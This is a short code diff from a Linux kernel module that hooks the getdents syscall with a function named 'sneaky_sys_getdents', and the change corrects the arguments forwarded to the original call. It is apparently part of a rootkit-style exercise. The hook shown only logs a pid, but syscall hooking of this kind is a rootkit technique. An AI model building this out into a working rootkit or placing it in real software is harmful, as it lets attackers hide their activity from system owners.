@@ -42,7 +42,7 @@ asmlinkage int (*original_call)(unsigned int fd, struct linux_dirent __user *dir
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
   printk(KERN_INFO "pid = %d\n", mypid);
-  return original_call(pathname, flags);
+  return original_call(fd, dirp, count);
 
 }
 
